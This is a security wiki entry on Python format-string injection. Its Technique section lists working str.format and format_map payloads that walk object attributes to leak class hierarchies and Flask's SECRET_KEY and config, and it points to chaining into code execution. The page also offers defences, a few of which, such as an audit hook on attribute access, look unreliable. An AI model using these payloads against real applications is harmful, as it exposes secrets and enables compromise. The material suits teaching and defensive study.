---
title: Python Format String Attribute Walks
slug: python-format-string
---

> **TL;DR:** `str.format` and f-strings let an attacker traverse attributes and indexes of the argument, leaking secrets and pivoting to RCE without ever calling `eval`.

## What it is
Python's PEP 3101 format mini-language supports `.attr` and `[key]` access on the substituted object. When a developer writes `template.format(user=user_obj)` with a template controlled by the attacker, the attacker can read `user.__class__`, walk to globals, and dump config. The bug class is the Python cousin of Java EL injection and is frequently mis-classified as "harmless template".

## Preconditions / where it applies
- A format string under attacker control passed to `str.format`, `str.format_map`, or used as an f-string built via `eval`
- At least one named or positional argument with reachable globals (Flask `request`, Django `settings`, ORM models)
- Audit hook absent for `str.format` (none exists by default)

## Technique
Each step uses only documented format syntax.

```python
# leak the class chain
"{0.__class__}".format(obj)
"{0.__class__.__mro__}".format(obj)

# walk to a useful subclass list
"{0.__class__.__mro__[1].__subclasses__}".format(obj)

# Flask: leak SECRET_KEY when a request object is in scope
"{request.application.__globals__[__builtins__]}".format(request=request)
"{0.__globals__[current_app].config[SECRET_KEY]}".format(view_func)

# dict-style: many configs expose __getitem__
"{config[SECRET_KEY]}".format(config=app.config)

# format_map with a hostile mapping skips arg validation
class M(dict):
    def __missing__(self, k): return k
"{a.__class__.__bases__[0].__subclasses__}".format_map(M())
```

The leak alone is usually enough for a CTF flag; pivot to RCE by chaining to `os._wrap_close` per [[python-sandbox-escape]].

## Detection and defence
- Replace `str.format` on user-controlled templates with `string.Template` (only `$name`, no attribute walk) or Jinja2 with autoescape and a sandboxed environment
- Lint for `.format(` / `format_map(` where the format string is not a literal — Bandit rule B608-style
- Add an audit hook on `object.__getattribute__` that alarms when the caller frame is in `string.Formatter`
- Strip `__globals__`, `__class__`, `__init__` from any object surfaced to a template

## References
- [PEP 3101 — Advanced String Formatting](https://peps.python.org/pep-3101/) — defines the attribute syntax
- [Python string.Formatter docs](https://docs.python.org/3/library/string.html#string.Formatter) — safer subclassing surface

See also: [[python-sandbox-escape]], [[python-ssti-jinja]], [[python-dangerous-sinks]].
